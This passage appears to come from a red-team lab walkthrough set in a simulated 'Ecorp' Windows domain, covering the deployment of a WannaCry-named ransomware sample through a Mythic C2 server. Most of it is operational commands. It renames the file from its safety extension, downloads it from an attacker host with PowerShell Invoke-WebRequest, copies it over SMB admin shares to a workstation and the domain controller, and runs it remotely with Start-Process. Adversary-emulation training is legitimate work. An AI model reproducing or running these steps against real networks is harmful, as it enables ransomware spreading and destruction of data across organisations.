Notice the .malz extension. This is used as another layer of protection to prevent it from executing by accident. If it was double clicked with that extension, it would not execute. However, we can not deploy it to our victims with that extension, so we will rename it. Remember, with Linux we rename it using the mv command to the same directory it is already in. As seen below:

```go
mv Ransomware.wannacry.exe.malz Ransomware.wannacry.exe
```

When we run “ls” we see the name was changed. The ransomware is now ready to be deployed.

![image.png](Screenshots/07-DataDestruction/image23.webp)

## Deploying the Ransomware

From the Mythic C2 server run the command below

```go
powershell Invoke-WebRequest -Uri "[http://10.6.6.6:8000/Ransomware.wannacry.exe](http://10.6.6.6:8000/fsociety.exe)" -OutFile "C:\Users\tcolby\Desktop\Ransomware.wannacry.exe"
```

![image.png](Screenshots/07-DataDestruction/image24.webp)

As seen above the ransomware was written to the Desktop of the tcolby machine.

Now move the ransomware to wrk-price.

```go
cp "C:\Users\tcolby\Desktop\Ransomware.wannacry.exe" "\\wrk-price.Ecorp.local\C$\Users\pprice\Desktop\Ransomware.wannacry.exe"
```

![image.png](Screenshots/07-DataDestruction/image25.webp)

Now move the ransomware to the Domain Controller

```go
cp "C:\Users\tcolby\Desktop\Ransomware.wannacry.exe" "\\Ecorp-DC.Ecorp.local\C$\Users\Administrator\Desktop\Ransomware.wannacry.exe"
```

![image.png](Screenshots/07-DataDestruction/image26.webp)

The ransomware is now deployed across the network. 

We are now ready to launch the ransomware. Ensure that you have a snapshot of each VM to revert back to.

## Executing the Ransomware

We will execute the ransomware from the Mythic C2 server. Since we are using SMB from the wrk-colby machine it should be the last system we infect. We will start with the wrk-price system first. Use the command below to execute it. 

```go
powershell "Start-Process -FilePath '\\wrk-price.Ecorp.local\C$\Users\pprice\Desktop\Ransomware.wannacry.exe'"
```

![image.png](Screenshots/07-DataDestruction/image27.webp)

Use the command below to execute the ransomware on the Domain Controller.

powershell "Start-Process -FilePath '\\Ecorp-DC.Ecorp.local\C$\Users\Administrator\Desktop\Ransomware.wannacry.exe'"
